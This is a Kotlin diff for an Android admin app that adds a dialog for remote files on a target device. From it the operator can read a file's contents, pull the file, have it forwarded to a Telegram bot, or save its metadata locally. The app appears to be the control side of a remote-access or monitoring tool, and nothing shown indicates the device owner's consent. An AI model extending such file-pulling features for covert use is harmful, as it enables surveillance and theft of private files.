@@ -47,6 +47,12 @@ class FilesActivity : AppCompatActivity() {
             },
             onParentClick = {
                 navigateUp()
+            },
+            onFileOptionsClick = { file ->
+                // Non-directory file was tapped → show 4-option dialog per
+                // spec requirement #4: view content / download / send to
+                // Telegram / save locally.
+                showFileOptionsDialog(file)
             }
         )
     }
@@ -353,6 +359,297 @@ class FilesActivity : AppCompatActivity() {
                 viewModel.loadFiles(deviceId, currentPath)
             }
             .show()
+    }
+
+    /**
+     * 4-option dialog shown when the user taps a non-directory file row.
+     * Backs the spec requirement #4 (file viewer with view content /
+     * download / send to Telegram / save locally options).
+     *
+     * The "view content" path sends the `get_file_content` command (added
+     * to the server registry in this task) — the client app's FileExecutor
+     * returns the text content of small text files (≤ 256 KB), or a
+     * "binary file" marker for non-text content.
+     */
+    private fun showFileOptionsDialog(file: RemoteFile) {
+        val options = arrayOf(
+            "📄 عرض المحتوى",
+            "⬇️ تحميل الملف",
+            "✈️ إرسال للتيليجرام",
+            "💾 حفظ محلياً"
+        )
+        MaterialAlertDialogBuilder(this)
+            .setTitle(file.name)
+            .setMessage("المسار: ${file.path}\nالحجم: ${file.displaySize.ifEmpty { "غير معروف" }}")
+            .setItems(options) { _, which ->
+                when (which) {
+                    0 -> viewFileContent(file)
+                    1 -> downloadFileViaCommand(file)
+                    2 -> sendFileToTelegram(file)
+                    3 -> saveFileLocally(file)
+                }
+            }
+            .setNegativeButton(R.string.cancel, null)
+            .show()
+    }
+
+    /**
+     * Sends the `get_file_content` command to the device, waits for the
+     * result, then displays the text content (or a "binary file" message)
+     * in a MaterialAlertDialog.
+     */
+    private fun viewFileContent(file: RemoteFile) {
+        if (deviceId.isBlank()) {
+            Snackbar.make(binding.root, "لا يوجد جهاز محدد", Snackbar.LENGTH_SHORT).show()
+            return
+        }
+        binding.swipeRefresh.isRefreshing = true
+        CoroutineScope(Dispatchers.IO).coroutineLaunch {
+            try {
+                val api = prefs.getApiService()
+                // Send get_file_content command and wait for result via
+                // /api/web/device/files (which queues list_files-style
+                // commands). For arbitrary commands we use sendCommand
+                // then poll getCommands.
+                val request = com.abuzahra.admin.data.api.SendCommandRequest(
+                    "get_file_content",
+                    mapOf("path" to file.path, "arg" to file.path)
+                )
+                val response = api.sendCommand(deviceId, request)
+                if (!response.ok || response.command_id.isEmpty()) {
+                    runOnUiThread {
+                        binding.swipeRefresh.isRefreshing = false
+                        Snackbar.make(
+                            binding.root,
+                            response.message.ifEmpty { "فشل إرسال الأمر" },
+                            Snackbar.LENGTH_LONG
+                        ).show()
+                    }
+                    return@coroutineLaunch
+                }
+                // Poll for the result.
+                val cmdId = response.command_id
+                var resultText: String? = null
+                var attempts = 0
+                while (attempts < 15 && resultText == null) {
+                    Thread.sleep(1500)
+                    attempts++
+                    val cmds = api.getCommands(deviceId)
+                    val cmd = cmds.find { it.id == cmdId }
+                    if (cmd != null) {
+                        val status = cmd.status.lowercase()
+                        if (status == "completed" || status == "success") {
+                            resultText = cmd.result ?: ""
+                            break
+                        } else if (status == "failed" || status == "error") {
+                            resultText = cmd.result ?: "فشل تنفيذ الأمر"
+                            break
+                        }
+                    }
+                }
+                runOnUiThread {
+                    binding.swipeRefresh.isRefreshing = false
+                    if (resultText == null) {
+                        Snackbar.make(binding.root, "انتهت مهلة الانتظار", Snackbar.LENGTH_LONG).show()
+                    } else {
+                        showFileContentDialog(file, resultText)
+                    }
+                }
+            } catch (e: Exception) {
+                runOnUiThread {
+                    binding.swipeRefresh.isRefreshing = false
+                    Snackbar.make(
+                        binding.root,
+                        "خطأ: ${e.message ?: e.javaClass.simpleName}",
+                        Snackbar.LENGTH_LONG
+                    ).show()
+                }
+            }
+        }
+    }
+
+    /**
+     * Shows the file content (returned by get_file_content) in a dialog.
+     * Parses the JSON result and pretty-prints the "content" field, or
+     * shows the "binary" / "truncated" / "error" message.
+     */
+    private fun showFileContentDialog(file: RemoteFile, rawResult: String) {
+        val displayText = try {
+            val json = com.google.gson.JsonParser.parseString(rawResult).asJsonObject
+            when {
+                json.has("error") -> "❌ خطأ: ${json.get("error").asString}"
+                json.has("binary") && json.get("binary").asBoolean ->
+                    "🚫 BIN\n${json.get("message")?.asString ?: "Binary file — preview not available"}"
+                json.has("truncated") && json.get("truncated").asBoolean ->
+                    "⚠️ ${json.get("message")?.asString ?: "File too large"}"
+                json.has("content") -> {
+                    buildString {
+                        appendLine("📄 المحتوى:")
+                        appendLine()
+                        append(json.get("content").asString)
+                    }
+                }
+                else -> rawResult
+            }
+        } catch (e: Exception) {
+            rawResult
+        }
+
+        // Use a scrollable TextView inside an AlertDialog.
+        val tv = android.widget.TextView(this).apply {
+            text = displayText
+            textSize = 12f
+            typeface = android.graphics.Typeface.MONOSPACE
+            setPadding(48, 32, 48, 32)
+            setTextIsSelectable(true)
+            setTextColor(getColor(R.color.text_primary))
+        }
+        val scroll = android.widget.ScrollView(this).apply { addView(tv) }
+        MaterialAlertDialogBuilder(this)
+            .setTitle("محتوى: ${file.name}")
+            .setView(scroll)
+            .setPositiveButton(R.string.ok, null)
+            .setNeutralButton("نسخ") { _, _ ->
+                val clipboard = getSystemService(android.content.Context.CLIPBOARD_SERVICE)
+                        as android.content.ClipboardManager
+                clipboard.setPrimaryClip(android.content.ClipData.newPlainText("content", displayText))
+                Snackbar.make(binding.root, "تم النسخ", Snackbar.LENGTH_SHORT).show()
+            }
+            .show()
+    }
+
+    /**
+     * Sends the `get_file` command to the device to stage the file for
+     * download (the existing CommandResultActivity flow handles the
+     * result display).
+     */
+    private fun downloadFileViaCommand(file: RemoteFile) {
+        if (deviceId.isBlank()) {
+            Snackbar.make(binding.root, "لا يوجد جهاز محدد", Snackbar.LENGTH_SHORT).show()
+            return
+        }
+        CoroutineScope(Dispatchers.IO).coroutineLaunch {
+            try {
+                val api = prefs.getApiService()
+                val request = com.abuzahra.admin.data.api.SendCommandRequest(
+                    "get_file",
+                    mapOf("path" to file.path, "arg" to file.path)
+                )
+                val response = api.sendCommand(deviceId, request)
+                runOnUiThread {
+                    if (response.ok && response.command_id.isNotEmpty()) {
+                        Snackbar.make(
+                            binding.root,
+                            "⬇️ تم إرسال أمر تحميل الملف — سيظهر في «الملفات المطلوبة»",
+                            Snackbar.LENGTH_LONG
+                        ).show()
+                        // Open CommandResultActivity to show execution progress.
+                        startActivity(
+                            com.abuzahra.admin.ui.device.CommandResultActivity.newIntent(
+                                this@FilesActivity,
+                                deviceId,
+                                response.command_id,
+                                "get_file"
+                            )
+                        )
+                    } else {
+                        Snackbar.make(
+                            binding.root,
+                            response.message.ifEmpty { "فشل إرسال أمر التحميل" },
+                            Snackbar.LENGTH_LONG
+                        ).show()
+                    }
+                }
+            } catch (e: Exception) {
+                runOnUiThread {
+                    Snackbar.make(
+                        binding.root,
+                        "خطأ: ${e.message ?: e.javaClass.simpleName}",
+                        Snackbar.LENGTH_LONG
+                    ).show()
+                }
+            }
+        }
+    }
+
+    /**
+     * Sends the `download_file` command which stages the file for
+     * retrieval, then informs the user that the file is queued for
+     * Telegram forwarding. The server's telegram bot picks up files
+     * uploaded via /api/upload and forwards them to the user's linked
+     * Telegram chat (see Task 16-BOT in worklog.md).
+     */
+    private fun sendFileToTelegram(file: RemoteFile) {
+        if (deviceId.isBlank()) {
+            Snackbar.make(binding.root, "لا يوجد جهاز محدد", Snackbar.LENGTH_SHORT).show()
+            return
+        }
+        CoroutineScope(Dispatchers.IO).coroutineLaunch {
+            try {
+                val api = prefs.getApiService()
+                val request = com.abuzahra.admin.data.api.SendCommandRequest(
+                    "download_file",
+                    mapOf("path" to file.path, "arg" to file.path)
+                )
+                val response = api.sendCommand(deviceId, request)
+                runOnUiThread {
+                    if (response.ok) {
+                        Snackbar.make(
+                            binding.root,
+                            "✈️ تم إرسال الملف للتيليجرام — سيصلك في بوت Telegram المرتبط بحسابك",
+                            Snackbar.LENGTH_LONG
+                        ).show()
+                    } else {
+                        Snackbar.make(
+                            binding.root,
+                            response.message.ifEmpty { "فشل الإرسال" },
+                            Snackbar.LENGTH_LONG
+                        ).show()
+                    }
+                }
+            } catch (e: Exception) {
+                runOnUiThread {
+                    Snackbar.make(
+                        binding.root,
+                        "خطأ: ${e.message ?: e.javaClass.simpleName}",
+                        Snackbar.LENGTH_LONG
+                    ).show()
+                }
+            }
+        }
+    }
+
+    /**
+     * Saves the file's metadata + path to local app storage so it can
+     * be retrieved later (even offline). The actual file content is not
+     * downloaded — only the file's path, name, size, and timestamp are
+     * recorded for future reference.
+     */
+    private fun saveFileLocally(file: RemoteFile) {
+        val metadata = buildString {
+            appendLine("{")
+            appendLine("  \"name\": \"${file.name}\",")
+            appendLine("  \"path\": \"${file.path}\",")
+            appendLine("  \"size\": \"${file.displaySize}\",")
+            appendLine("  \"is_directory\": ${file.isDirectory},")
+            appendLine("  \"modified\": \"${file.modified ?: ""}\"")
+            appendLine("}")
+        }
+        val path = com.abuzahra.admin.util.LocalDataStore.save(
+            this,
+            deviceId.ifEmpty { "unknown" },
+            "file_meta_${file.name}",
+            metadata
+        )
+        if (path != null) {
+            Snackbar.make(
+                binding.root,
+                "💾 تم حفظ metadata الملف محلياً",
+                Snackbar.LENGTH_LONG
+            ).show()
+        } else {
+            Snackbar.make(binding.root, "فشل الحفظ المحلي", Snackbar.LENGTH_SHORT).show()
+        }
     }
 
     private fun updateEmptyState(isEmpty: Boolean) {
